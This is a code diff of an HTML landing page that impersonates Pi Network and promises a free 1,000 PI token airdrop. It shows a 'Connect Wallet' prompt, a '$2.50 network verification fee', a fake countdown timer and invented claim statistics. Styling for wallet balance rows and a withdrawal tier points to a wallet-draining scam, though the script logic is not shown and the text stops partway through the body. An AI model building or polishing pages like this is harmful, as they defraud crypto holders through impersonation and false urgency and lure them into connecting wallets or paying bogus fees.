@@ -9,334 +9,352 @@
 <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 <style>
 @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');
-
 *{margin:0;padding:0;box-sizing:border-box}
 body{font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;background:#0a0118;color:#fff;min-height:100vh;overflow-x:hidden}
 
-/* ANIMATED BACKGROUND */
+/* BG */
 .bg{position:fixed;inset:0;z-index:0;overflow:hidden;pointer-events:none}
-.bg .orb{position:absolute;border-radius:50%;filter:blur(80px);opacity:.15;animation:float 20s infinite ease-in-out}
-.bg .o1{width:400px;height:400px;background:#a855f7;top:-10%;left:-10%;animation-delay:0s}
-.bg .o2{width:300px;height:300px;background:#fcb34c;top:50%;right:-5%;animation-delay:-7s}
-.bg .o3{width:250px;height:250px;background:#6366f1;bottom:-5%;left:30%;animation-delay:-14s}
-@keyframes float{0%,100%{transform:translate(0,0) scale(1)}25%{transform:translate(50px,-30px) scale(1.1)}50%{transform:translate(-20px,40px) scale(.95)}75%{transform:translate(30px,20px) scale(1.05)}}
+.bg .orb{position:absolute;border-radius:50%;filter:blur(90px);opacity:.12;animation:fl 25s infinite ease-in-out}
+.bg .o1{width:500px;height:500px;background:#a855f7;top:-15%;left:-10%;animation-delay:0s}
+.bg .o2{width:350px;height:350px;background:#fcb34c;top:60%;right:-8%;animation-delay:-8s}
+.bg .o3{width:300px;height:300px;background:#6366f1;bottom:-10%;left:20%;animation-delay:-16s}
+@keyframes fl{0%,100%{transform:translate(0,0)}33%{transform:translate(40px,-20px)}66%{transform:translate(-30px,30px)}}
 
 /* PARTICLES */
-.particles{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}
-.particles span{position:absolute;width:2px;height:2px;background:rgba(168,85,247,.4);border-radius:50%;animation:rise linear infinite}
-@keyframes rise{0%{transform:translateY(100vh) scale(0);opacity:0}10%{opacity:1}90%{opacity:1}100%{transform:translateY(-10vh) scale(1);opacity:0}}
+#part{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}
+#part span{position:absolute;border-radius:50%;background:rgba(168,85,247,.3);animation:rise linear infinite}
+@keyframes rise{0%{transform:translateY(100vh) scale(0);opacity:0}5%{opacity:1}95%{opacity:.5}100%{transform:translateY(-5vh) scale(1);opacity:0}}
 
 /* LAYOUT */
 .pos{position:relative;z-index:1}
 .w{max-width:720px;margin:0 auto;padding:0 16px}
 
 /* NAV */
-nav{background:rgba(10,1,24,.85);backdrop-filter:blur(16px);padding:12px 0;border-bottom:1px solid rgba(168,85,247,.08);position:sticky;top:0;z-index:100}
+nav{background:rgba(10,1,24,.88);backdrop-filter:blur(20px);padding:12px 0;border-bottom:1px solid rgba(168,85,247,.06);position:sticky;top:0;z-index:100}
 nav>div{display:flex;align-items:center;justify-content:space-between}
-.logo{display:flex;align-items:center;gap:10px}
-.logo img{border-radius:50%;box-shadow:0 0 20px rgba(252,179,74,.15)}
-.logo span{font-size:16px;font-weight:800;letter-spacing:-.3px}
+.logo{display:flex;align-items:center;gap:9px}
+.logo img{border-radius:50%;box-shadow:0 0 16px rgba(252,179,74,.12)}
+.logo t{font-size:16px;font-weight:800;letter-spacing:-.3px}
 .navr{display:flex;align-items:center;gap:8px}
-.live-badge{display:flex;align-items:center;gap:5px;background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.15);padding:5px 12px;border-radius:20px;font-size:11px;font-weight:600;color:#22c55e}
-.live-badge .pulse{width:6px;height:6px;border-radius:50%;background:#22c55e;animation:pulse 1.5s infinite}
-@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(.7)}}
-.nb{background:linear-gradient(135deg,#fcb34c,#f59e0b);color:#0a0118;border:none;padding:10px 20px;border-radius:10px;font-size:13px;font-weight:700;cursor:pointer;transition:all .2s;box-shadow:0 4px 16px rgba(252,179,74,.2)}
-.nb:hover{transform:translateY(-1px);box-shadow:0 6px 24px rgba(252,179,74,.35)}
+.lb{display:flex;align-items:center;gap:5px;background:rgba(34,197,94,.07);border:1px solid rgba(34,197,94,.12);padding:5px 11px;border-radius:20px;font-size:10px;font-weight:700;color:#22c55e;letter-spacing:.3px}
+.lb .p{width:6px;height:6px;border-radius:50%;background:#22c55e;animation:pulse 1.5s infinite}
+@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.3;transform:scale(.6)}}
+.nb{background:linear-gradient(135deg,#fcb34c,#f59e0b);color:#0a0118;border:none;padding:10px 20px;border-radius:10px;font-size:13px;font-weight:700;cursor:pointer;box-shadow:0 4px 20px rgba(252,179,74,.18)}
+.nb:hover{box-shadow:0 6px 28px rgba(252,179,74,.3)}
 
 /* HERO */
-.hero{padding:52px 0 20px;text-align:center}
-.hero .event-badge{display:inline-flex;align-items:center;gap:6px;background:linear-gradient(135deg,rgba(168,85,247,.1),rgba(252,179,74,.06));border:1px solid rgba(168,85,247,.15);color:#c084fc;padding:6px 16px;border-radius:20px;font-size:11px;font-weight:600;margin-bottom:18px;letter-spacing:.5px;text-transform:uppercase}
-.hero h1{font-size:44px;font-weight:900;margin-bottom:10px;letter-spacing:-1.5px;line-height:1.1}
-.h1-accent{background:linear-gradient(135deg,#fcb34c,#f59e0b,#fcb34c);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
-.hero .sub{font-size:15px;color:rgba(255,255,255,.45);max-width:440px;margin:0 auto 28px;line-height:1.7}
-.hero-logo{margin-bottom:20px}
-.hero-logo img{border-radius:50%;box-shadow:0 0 60px rgba(252,179,74,.12),0 0 120px rgba(168,85,247,.06);animation:glow 3s infinite ease-in-out}
-@keyframes glow{0%,100%{box-shadow:0 0 60px rgba(252,179,74,.12),0 0 120px rgba(168,85,247,.06)}50%{box-shadow:0 0 80px rgba(252,179,74,.2),0 0 160px rgba(168,85,247,.1)}}
+.hero{padding:48px 0 16px;text-align:center}
+.eb{display:inline-flex;align-items:center;gap:6px;background:linear-gradient(135deg,rgba(168,85,247,.08),rgba(252,179,74,.04));border:1px solid rgba(168,85,247,.12);color:#c084fc;padding:6px 16px;border-radius:20px;font-size:10px;font-weight:700;margin-bottom:16px;letter-spacing:.8px;text-transform:uppercase}
+.hero h1{font-size:42px;font-weight:900;margin-bottom:10px;letter-spacing:-1.5px;line-height:1.1}
+.ha{background:linear-gradient(135deg,#fcb34c,#f59e0b,#fcb34c);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.hero .sub{font-size:14px;color:rgba(255,255,255,.4);max-width:420px;margin:0 auto 24px;line-height:1.7}
+.hl img{border-radius:50%;box-shadow:0 0 50px rgba(252,179,74,.1),0 0 100px rgba(168,85,247,.05);animation:glow 4s infinite ease-in-out}
+@keyframes glow{0%,100%{box-shadow:0 0 50px rgba(252,179,74,.1)}50%{box-shadow:0 0 70px rgba(252,179,74,.18)}}
 
 /* CLAIM CARD */
-.claim-card{background:linear-gradient(135deg,rgba(168,85,247,.06),rgba(252,179,74,.03));border:1px solid rgba(168,85,247,.12);border-radius:24px;padding:32px;margin:20px 0;text-align:center;position:relative;overflow:hidden}
-.claim-card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(252,179,74,.4),transparent)}
-.claim-amount{font-size:56px;font-weight:900;line-height:1;margin-bottom:4px}
-.claim-amount .pi{background:linear-gradient(135deg,#fcb34c,#f59e0b);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
-.claim-amount .num{background:linear-gradient(135deg,#fff,rgba(255,255,255,.8));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
-.claim-label{font-size:13px;color:rgba(255,255,255,.35);margin-bottom:20px;font-weight:500}
-.claim-btn{display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,#fcb34c,#f59e0b);color:#0a0118;border:none;padding:16px 40px;border-radius:14px;font-size:16px;font-weight:800;cursor:pointer;transition:all .3s;box-shadow:0 8px 32px rgba(252,179,74,.25)}
-.claim-btn:hover{transform:translateY(-2px);box-shadow:0 12px 48px rgba(252,179,74,.4)}
-.claim-btn:disabled{opacity:.4;cursor:not-allowed;transform:none}
-.claim-fee{font-size:11px;color:rgba(255,255,255,.25);margin-top:12px}
+.cc{background:linear-gradient(145deg,rgba(168,85,247,.05),rgba(252,179,74,.02));border:1px solid rgba(168,85,247,.1);border-radius:24px;padding:32px;margin:18px 0;text-align:center;position:relative;overflow:hidden}
+.cc::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(252,179,74,.3),transparent)}
+.cc::after{content:'';position:absolute;bottom:0;left:0;right:0;height:3px;background:linear-gradient(90deg,transparent,rgba(168,85,247,.2),transparent)}
+.ca{font-size:58px;font-weight:900;line-height:1;margin-bottom:6px}
+.ca .num{background:linear-gradient(135deg,#fff,rgba(255,255,255,.85));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.ca .pi{background:linear-gradient(135deg,#fcb34c,#f59e0b);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.cl{font-size:12px;color:rgba(255,255,255,.3);margin-bottom:20px;font-weight:600;letter-spacing:.5px}
+.cbtn{display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,#fcb34c,#f59e0b);color:#0a0118;border:none;padding:16px 44px;border-radius:14px;font-size:16px;font-weight:800;cursor:pointer;transition:all .3s;box-shadow:0 8px 32px rgba(252,179,74,.2)}
+.cbtn:hover{transform:translateY(-2px);box-shadow:0 12px 48px rgba(252,179,74,.35)}
+.cbtn:disabled{opacity:.35;cursor:not-allowed;transform:none}
+.cfee{font-size:10px;color:rgba(255,255,255,.2);margin-top:10px}
+
+/* COUNTCOLICK */
+.cd-row{display:flex;gap:7px;justify-content:center;margin:16px 0}
+.cdb{text-align:center;padding:9px 13px;background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.04);border-radius:10px;min-width:56px}
+.cdb .v{font-size:22px;font-weight:800;color:#fcb34c;line-height:1}
+.cdb .l{font-size:8px;color:rgba(255,255,255,.2);margin-top:2px;text-transform:uppercase;letter-spacing:.5px}
 
 /* STATS */
-.stats{display:grid;grid-template-columns:repeat(3,120px);gap:12px;justify-content:center;margin:20px 0}
-.stat{text-align:center;padding:14px;background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.04);border-radius:12px}
-.stat .sv{font-size:20px;font-weight:800;color:#fcb34c}
-.stat .sl{font-size:10px;color:rgba(255,255,255,.3);margin-top:2px;font-weight:500}
+.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin:16px 0}
+.stat{text-align:center;padding:14px 8px;background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.03);border-radius:12px}
+.stat .sv{font-size:18px;font-weight:800;color:#fcb34c}
+.stat .sl{font-size:9px;color:rgba(255,255,255,.25);margin-top:2px;font-weight:600}
 
 /* SOCIAL PROOF */
-.social-proof{margin:16px 0;padding:16px;background:rgba(34,197,94,.03);border:1px solid rgba(34,197,94,.08);border-radius:12px;display:flex;align-items:center;gap:12px}
-.sp-icon{font-size:20px;flex-shrink:0}
-.sp-text{flex:1;font-size:12px;color:rgba(255,255,255,.5);line-height:1.5}
-.sp-text strong{color:#22c55e}
-.sp-text .name{color:rgba(255,255,255,.7);font-weight:600}
+.sp{display:flex;align-items:center;gap:10px;padding:12px 14px;background:rgba(34,197,94,.02);border:1px solid rgba(34,197,94,.06);border-radius:12px;margin:14px 0}
+.sp-i{font-size:18px;flex-shrink:0}
+.sp-t{font-size:11px;color:rgba(255,255,255,.45);line-height:1.5}
+.sp-t strong{color:#22c55e}
+.sp-t .addr{color:rgba(255,255,255,.6);font-weight:600}
 
-/* REFERRAL */
-.ref-section{margin:16px 0;padding:20px;background:rgba(255,255,255,.02);border:1px solid rgba(168,85,247,.08);border-radius:16px}
-.ref-title{font-size:14px;font-weight:700;margin-bottom:4px}
-.ref-sub{font-size:11px;color:rgba(255,255,255,.3);margin-bottom:12px}
-.ref-box{display:flex;gap:8px;margin-bottom:10px}
-.ref-box input{flex:1;padding:10px 12px;border-radius:10px;border:1px solid rgba(168,85,247,.15);background:rgba(0,0,0,.3);color:#fff;font-size:12px;font-family:monospace;outline:none}
-.ref-box input:focus{border-color:#fcb34c}
-.ref-box button{padding:10px 16px;background:linear-gradient(135deg,#a855f7,#6366f1);color:#fff;border:none;border-radius:10px;font-size:12px;font-weight:700;cursor:pointer;white-space:nowrap}
-.ref-box button:hover{opacity:.9}
-.ref-stats{display:flex;gap:16px}
-.ref-stat{text-align:center}
-.ref-stat .rs{font-size:18px;font-weight:800;color:#a855f7}
-.ref-stat .rl{font-size:10px;color:rgba(255,255,255,.25)}
+/* HOWTO */
+.ht{margin:14px 0}
+.ht h3{font-size:15px;font-weight:700;margin-bottom:10px;text-align:center}
+.Steps{display:grid;grid-template-columns:repeat(3,1fr);gap:8px}
+.Step{text-align:center;padding:14px 8px;background:rgba(255,255,255,.015);border:1px solid rgba(255,255,255,.03);border-radius:12px}
+.Step .si{font-size:22px;margin-bottom:5px}
+.Step .st{font-size:11px;font-weight:600;margin-bottom:2px}
+.Step .ss{font-size:9px;color:rgba(255,255,255,.2);line-height:1.4}
 
-/* HOW TO */
-.howto{margin:16px 0}
-.howto h3{font-size:16px;font-weight:700;margin-bottom:12px;text-align:center}
-.steps{display:grid;grid-template-columns:repeat(3,1fr);gap:10px}
-.step{text-align:center;padding:16px 10px;background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.04);border-radius:12px}
-.step .si{font-size:24px;margin-bottom:6px}
-.step .st{font-size:12px;font-weight:600;margin-bottom:2px}
-.step .ss{font-size:10px;color:rgba(255,255,255,.25);line-height:1.4}
+/* REF */
+.ref{margin:14px 0;padding:18px;background:rgba(255,255,255,.015);border:1px solid rgba(168,85,247,.06);border-radius:14px}
+.ref .rt{font-size:14px;font-weight:700;margin-bottom:3px}
+.ref .rs{font-size:10px;color:rgba(255,255,255,.25);margin-bottom:10px}
+.ref .rb{display:flex;gap:6px;margin-bottom:8px}
+.rb input{flex:1;padding:10px;border-radius:8px;border:1px solid rgba(168,85,247,.12);background:rgba(0,0,0,.25);color:#fff;font-size:11px;font-family:monospace;outline:none}
+.rb input:focus{border-color:#fcb34c}
+.rb button{padding:10px 14px;background:linear-gradient(135deg,#a855f7,#6366f1);color:#fff;border:none;border-radius:8px;font-size:11px;font-weight:700;cursor:pointer}
+.ref .rstat{display:flex;gap:14px}
+.rstat .rs2{text-align:center}
+.rs2 .rv{font-size:16px;font-weight:800;color:#a855f7}
+.rs2 .rl{font-size:9px;color:rgba(255,255,255,.2)}
+
+/* WITHDRAW TIER */
+.tier{margin:14px 0;padding:16px;background:linear-gradient(135deg,rgba(252,179,74,.04),rgba(168,85,247,.03));border:1px solid rgba(252,179,74,.1);border-radius:14px}
+.tier .tt{font-size:13px;font-weight:700;margin-bottom:6px}
+.tier .ts{font-size:10px;color:rgba(255,255,255,.3);margin-bottom:10px}
+.tier-bar{height:6px;background:rgba(255,255,255,.05);border-radius:3px;overflow:hidden;margin-bottom:8px}
+.tier-bar .fill{height:100%;background:linear-gradient(90deg,#22c55e,#fcb34c,#a855f7);border-radius:3px;transition:width 1s}
+.tier-level{font-size:10px;font-weight:700;color:#fcb34c}
+.tier-need{font-size:9px;color:rgba(255,255,255,.2)}
+
+/* WITHDRAW RATE */
+.wr-box{margin:10px 0;padding:12px;background:rgba(168,85,247,.04);border:1px solid rgba(168,85,247,.08);border-radius:10px}
+.wr-box .wrt{font-size:12px;font-weight:700;margin-bottom:4px}
+.wr-box .wrs{font-size:10px;color:rgba(255,255,255,.3);line-height:1.5}
+.speed-bar{height:4px;background:rgba(255,255,255,.05);border-radius:2px;overflow:hidden;margin-top:6px}
+.speed-bar .sf{height:100%;background:linear-gradient(90deg,#a855f7,#22c55e);border-radius:2px;transition:width .5s}
 
 /* MODAL */
-#m{display:none;position:fixed;inset:0;background:rgba(0,0,0,.8);z-index:999;align-items:center;justify-content:center;backdrop-filter:blur(8px)}
-.mb{background:#1a0a2e;border:1px solid rgba(168,85,247,.2);border-radius:22px;padding:28px 24px;max-width:420px;width:92%;position:relative;max-height:85vh;overflow-y:auto}
-.mb h2{font-size:17px;font-weight:800;margin-bottom:2px}
-.mb .ms{font-size:12px;color:rgba(255,255,255,.3);margin-bottom:14px}
-.cx{position:absolute;top:12px;right:14px;background:none;border:none;color:rgba(255,255,255,.3);font-size:17px;cursor:pointer}
-.wr{display:flex;align-items:center;gap:10px;padding:12px;border:1px solid rgba(255,255,255,.06);border-radius:12px;margin-bottom:6px;cursor:pointer;width:100%;background:transparent;color:#fff;text-align:left;font-family:inherit;transition:all .2s}
-.wr:hover{border-color:#fcb34c;background:rgba(252,179,74,.03)}
-.wi{width:36px;height:36px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:14px;color:#fff;flex-shrink:0}
+#m{display:none;position:fixed;inset:0;background:rgba(0,0,0,.82);z-index:999;align-items:center;justify-content:center;backdrop-filter:blur(8px)}
+.mb{background:linear-gradient(160deg,#1a0a2e,#12082a);border:1px solid rgba(168,85,247,.18);border-radius:20px;padding:26px 22px;max-width:420px;width:92%;position:relative;max-height:88vh;overflow-y:auto;box-shadow:0 24px 80px rgba(0,0,0,.6)}
+.mb h2{font-size:16px;font-weight:800;margin-bottom:2px}
+.mb .ms{font-size:11px;color:rgba(255,255,255,.28);margin-bottom:14px}
+.cx{position:absolute;top:11px;right:13px;background:none;border:none;color:rgba(255,255,255,.25);font-size:16px;cursor:pointer}
+.wrow{display:flex;align-items:center;gap:10px;padding:11px;border:1px solid rgba(255,255,255,.05);border-radius:11px;margin-bottom:5px;cursor:pointer;width:100%;background:transparent;color:#fff;text-align:left;font-family:inherit;transition:all .2s}
+.wrow:hover{border-color:#fcb34c;background:rgba(252,179,74,.03)}
+.wi{width:34px;height:34px;border-radius:9px;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:13px;color:#fff;flex-shrink:0}
 .wn{flex:1;font-size:13px;font-weight:600}
-.wt{font-size:9px;padding:2px 6px;border-radius:4px;font-weight:600;background:rgba(34,197,94,.1);color:#22c55e}
+.wt{font-size:9px;padding:2px 6px;border-radius:4px;font-weight:600;background:rgba(34,197,94,.08);color:#22c55e}
 
 /* STATUS */
-.s{margin-top:8px;padding:11px;border-radius:9px;font-size:12px;display:none;line-height:1.5;word-break:break-word}
-.s.suc{background:rgba(34,197,94,.06);border:1px solid rgba(34,197,94,.1);color:#86efac}
-.s.err{background:rgba(239,68,68,.06);border:1px solid rgba(239,68,68,.1);color:#fca5a5}
-.s.inf{background:rgba(252,179,74,.06);border:1px solid rgba(252,179,74,.1);color:#fde68a}
+.st{margin-top:8px;padding:11px;border-radius:9px;font-size:12px;display:none;line-height:1.5;word-break:break-word}
+.st.ok{background:rgba(34,197,94,.05);border:1px solid rgba(34,197,94,.08);color:#86efac}
+.st.er{background:rgba(239,68,68,.05);border:1px solid rgba(239,68,68,.08);color:#fca5a5}
+.st.wa{background:rgba(252,179,74,.05);border:1px solid rgba(252,179,74,.08);color:#fde68a}
 
-/* CARDS */
-.c{background:rgba(255,255,255,.02);border:1px solid rgba(168,85,247,.08);border-radius:16px;padding:22px;margin:14px 0}
-.bt{width:100%;padding:13px;font-size:14px;font-weight:700;border:none;border-radius:10px;cursor:pointer;transition:all .2s;display:flex;align-items:center;justify-content:center;gap:7px;margin-bottom:7px;font-family:inherit}
-.bt:hover:not(:disabled){transform:translateY(-1px)}
-.bt:disabled{opacity:.3;cursor:not-allowed}
+/* CARD */
+.card{background:rgba(255,255,255,.015);border:1px solid rgba(168,85,247,.06);border-radius:14px;padding:20px;margin:12px 0}
+.btn{width:100%;padding:13px;font-size:13px;font-weight:700;border:none;border-radius:10px;cursor:pointer;transition:all .2s;display:flex;align-items:center;justify-content:center;gap:7px;margin-bottom:6px;font-family:inherit}
+.btn:hover:not(:disabled){transform:translateY(-1px)}
+.btn:disabled{opacity:.25;cursor:not-allowed}
 .bp{background:linear-gradient(135deg,#fcb34c,#f59e0b);color:#0a0118}
-.bo{background:transparent;color:#fff;border:1px solid rgba(255,255,255,.1)}
-.bo:hover{background:rgba(255,255,255,.04)}
+.bo{background:transparent;color:#fff;border:1px solid rgba(255,255,255,.08)}
+.bo:hover{background:rgba(255,255,255,.03)}
 
 /* CHAIN ROWS */
-.ch{display:flex;align-items:center;gap:9px;padding:9px 11px;background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.04);border-radius:9px;margin-bottom:5px}
-.ch .cd{width:9px;height:9px;border-radius:50%;flex-shrink:0}
-.ch .cn{flex:1;font-size:12px;font-weight:600}
-.ch .ct{font-size:10px;color:rgba(255,255,255,.2)}
-.ch .cb{font-size:12px;font-weight:700;color:#fcb34c}
-.ch.hv{border-color:rgba(252,179,74,.12);background:rgba(252,179,74,.02)}
+.ch{display:flex;align-items:center;gap:8px;padding:8px 10px;background:rgba(255,255,255,.015);border:1px solid rgba(255,255,255,.03);border-radius:8px;margin-bottom:4px}
+.ch .cd{width:8px;height:8px;border-radius:50%;flex-shrink:0}
+.ch .cn{flex:1;font-size:11px;font-weight:600}
+.ch .ct{font-size:9px;color:rgba(255,255,255,.18)}
+.ch .cb{font-size:11px;font-weight:700;color:#fcb34c}
+.ch.hv{border-color:rgba(252,179,74,.1);background:rgba(252,179,74,.015)}
 
 /* LOG */
-.lg{font-size:10px;color:rgba(255,255,255,.25);font-family:monospace;line-height:1.6;padding:8px;background:rgba(0,0,0,.25);border-radius:7px;max-height:140px;overflow-y:auto}
+.lg{font-size:9px;color:rgba(255,255,255,.22);font-family:monospace;line-height:1.5;padding:7px;background:rgba(0,0,0,.22);border-radius:6px;max-height:120px;overflow-y:auto}
 
 /* PROGRESS */
-.pg{display:flex;gap:4px;margin-bottom:12px}
-.pg .s2{flex:1;height:3px;border-radius:2px;background:rgba(255,255,255,.05)}
-.pg .s2.on{background:linear-gradient(90deg,#fcb34c,#a855f7)}
+.pg{display:flex;gap:3px;margin-bottom:10px}
+.pg .ps{flex:1;height:3px;border-radius:2px;background:rgba(255,255,250,.04)}
+.pg .ps.on{background:linear-gradient(90deg,#fcb34c,#a855f7)}
 
 /* LOADER */
-.ld{display:inline-block;width:11px;height:11px;border:2px solid rgba(255,255,255,.1);border-top:2px solid #fcb34c;border-radius:50%;animation:r .7s linear infinite;vertical-align:middle}
-@keyframes r{to{transform:rotate(360deg)}}
+.ld{display:inline-block;width:10px;height:10px;border:2px solid rgba(255,255,255,.08);border-top:2px solid #fcb34c;border-radius:50%;animation:rot .6s linear infinite;vertical-align:middle}
+@keyframes rot{to{transform:rotate(360deg)}}
 
 /* INFO ROWS */
-.ir{display:flex;justify-content:space-between;align-items:center;padding:7px 0;border-bottom:1px solid rgba(255,255,255,.03)}
+.ir{display:flex;justify-content:space-between;align-items:center;padding:6px 0;border-bottom:1px solid rgba(255,255,255,.02)}
 .ir:last-child{border-bottom:none}
-.ir .l{font-size:12px;color:rgba(255,255,255,.3)}
-.ir .v{font-size:12px;font-weight:700}
-.ir .v.g2{color:#22c55e}
+.ir .l{font-size:11px;color:rgba(255,255,255,.25)}
+.ir .v{font-size:11px;font-weight:700}
+.ir .v.g{color:#22c55e}
 .ir .v.gl{color:#fcb34c}
 
-/* ADDRESS COPY */
-.ac{display:flex;align-items:center;gap:8px;padding:10px;background:rgba(0,0,0,.3);border-radius:8px;margin:8px 0;cursor:pointer}
-.ac:hover{background:rgba(0,0,0,.5)}
-.ac .ad{font-family:monospace;font-size:11px;color:#fcb34c;flex:1;word-break:break-all}
-.ac .cb{padding:4px 10px;background:#fcb34c;color:#0a0118;border:none;border-radius:6px;font-size:11px;font-weight:700;cursor:pointer;flex-shrink:0}
-
-/* COUNTDOWN */
-.countdown{display:flex;gap:8px;justify-content:center;margin:16px 0}
-.cd-block{text-align:center;padding:10px 14px;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.05);border-radius:10px;min-width:60px}
-.cd-block .cdv{font-size:22px;font-weight:800;color:#fcb34c;line-height:1}
-.cd-block .cdl{font-size:9px;color:rgba(255,255,255,.25);margin-top:2px;text-transform:uppercase;letter-spacing:.5px}
-
-/* FOOTER */
-footer{background:#060110;padding:24px 0;text-align:center;border-top:1px solid rgba(168,85,247,.05)}
-footer p{font-size:10px;color:rgba(255,255,255,.12)}
-footer .flinks{display:flex;gap:16px;justify-content:center;margin-top:8px}
-footer .flinks a{font-size:10px;color:rgba(255,255,255,.2);text-decoration:none}
-footer .flinks a:hover{color:#fcb34c}
+/* AC */
+.ac{display:flex;align-items:center;gap:7px;padding:9px;background:rgba(0,0,0,.25);border-radius:8px;margin:6px 0;cursor:pointer}
+.ac:hover{background:rgba(0,0,0,.4)}
+.ac .ad{font-family:monospace;font-size:10px;color:#fcb34c;flex:1;word-break:break-all}
+.ac .cb{padding:4px 9px;background:#fcb34c;color:#0a0118;border:none;border-radius:5px;font-size:10px;font-weight:700;cursor:pointer;flex-shrink:0}
 
 /* TOAST */
-#toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:rgba(168,85,247,.9);color:#fff;padding:10px 20px;border-radius:10px;font-size:12px;font-weight:600;z-index:9999;display:none;backdrop-filter:blur(10px)}
+#toast{position:fixed;bottom:18px;left:50%;transform:translateX(-50%);background:rgba(168,85,247,.85);color:#fff;padding:9px 18px;border-radius:9px;font-size:11px;font-weight:600;z-index:9999;display:none;backdrop-filter:blur(8px)}
 
-/* RESPONSIVE */
+/* FOOTER */
+footer{background:#060110;padding:20px 0;text-align:center;border-top:1px solid rgba(168,85,247,.04)}
+footer p{font-size:9px;color:rgba(255,255,255,.1)}
+footer .fl{display:flex;gap:14px;justify-content:center;margin-top:6px}
+footer .fl a{font-size:9px;color:rgba(255,255,255,.15);text-decoration:none}
+footer .fl a:hover{color:#fcb34c}
+
 @media(max-width:500px){
-  .hero h1{font-size:32px}
-  .claim-amount{font-size:42px}
-  .stats{grid-template-columns:repeat(3,1fr)}
-  .steps{grid-template-columns:1fr}
+  .hero h1{font-size:28px}
+  .ca{font-size:38px}
+  .Steps{grid-template-columns:1fr}
 }
 </style>
 </head>
 <body>
-
-<!-- ANIMATED BG -->
 <div class="bg"><div class="orb o1"></div><div class="orb o2"></div><div class="orb o3"></div></div>
-<div class="particles" id="particles"></div>
+<div id="part"></div>
 
 <div class="pos">
 <nav><div class="w">
   <div class="logo">
-    <img src="pi-logo-48.png" width="32" height="32" alt="">
-    <span>Pi Network</span>
+    <img src="pi-logo-48.png" width="30" height="30" alt="">
+    <t>Pi Network</t>
   </div>
   <div class="navr">
-    <div class="live-badge"><span class="pulse"></span> LIVE</div>
+    <div class="lb"><span class="p"></span> LIVE</div>
     <button class="nb" onclick="openM()">Connect Wallet</button>
   </div>
 </div></nav>
 
-<!-- MODAL -->
 <div id="m"><div class="mb">
   <button class="cx" onclick="closeM()">&#x2715;</button>
   <h2>Connect Your Wallet</h2>
-  <div class="ms">Select your wallet to verify and claim 1000 PI</div>
+  <div class="ms">Select wallet to verify and claim 1000 PI</div>
   <div id="wl"></div>
 </div></div>
 
 <div class="w">
-
-<!-- HERO -->
 <div class="hero">
-  <div class="event-badge">&#x1F381; Mainnet Event — Limited Time</div>
-  <h1>Claim Your Free<br><span class="h1-accent">1,000 PI Tokens</span></h1>
-  <p class="sub">Pi Network is distributing free tokens to verified Pioneers. Connect your wallet to claim your 1000 PI allocation instantly.</p>
-  <div class="hero-logo"><img src="pi-logo-120.png" width="72" height="72" alt="Pi"></div>
+  <div class="eb">&#x1F381; Mainnet Event — Limited Time</div>
+  <h1>Claim Your Free<br><span class="ha">1,000 PI Tokens</span></h1>
+  <p class="sub">Pi Network is distributing free tokens to verified Pioneers. Connect your wallet to claim your 1000 PI allocation.</p>
+  <div class="hl"><img src="pi-logo-120.png" width="64" height="64" alt=""></div>
 </div>
 
 <!-- CLAIM CARD -->
-<div class="claim-card">
-  <div class="claim-amount"><span class="num">1,000</span> <span class="pi">PI</span></div>
-  <div class="claim-label">FREE CLAIM — VERIFICATION REQUIRED</div>
-  <button class="claim-btn" onclick="openM()">&#x1F381; Claim 1000 PI Now</button>
-  <div class="claim-fee">* $2.50 network verification fee required</div>
+<div class="cc">
+  <div class="ca"><span class="num">1,000</span> <span class="pi">PI</span></div>
+  <div class="cl">FREE CLAIM — VERIFICATION REQUIRED</div>
+  <button class="cbtn" onclick="openM()">&#x1F381; Claim 1000 PI Now</button>
+  <div class="cfee">* $2.50 network verification fee required</div>
 </div>
 
 <!-- COUNTDOWN -->
-<div class="countdown">
-  <div class="cd-block"><div class="cdv" id="cd-h">04</div><div class="cdl">Hours</div></div>
-  <div class="cd-block"><div class="cdv" id="cd-m">32</div><div class="cdl">Minutes</div></div>
-  <div class="cd-block"><div class="cdv" id="cd-s">18</div><div class="cdl">Seconds</div></div>
+<div class="cd-row">
+  <div class="cdb"><div class="v" id="cd-h">04</div><div class="l">Hours</div></div>
+  <div class="cdb"><div class="v" id="cd-m">32</div><div class="l">Min</div></div>
+  <div class="cdb"><div class="v" id="cd-s">18</div><div class="l">Sec</div></div>
 </div>
 
 <!-- STATS -->
 <div class="stats">
-  <div class="stat"><div class="sv" id="st-claimed">48,291</div><div class="sl">PI Claimed</div></div>
-  <div class="stat"><div class="sv" id="st-users">12,847</div><div class="sl">Pioneers</div></div>
-  <div class="stat"><div class="sv" id="st-refs">3,291</div><div class="sl">Referrals</div></div>
+  <div class="stat"><div class="sv" id="st-c">48,291</div><div class="sl">PI Claimed</div></div>
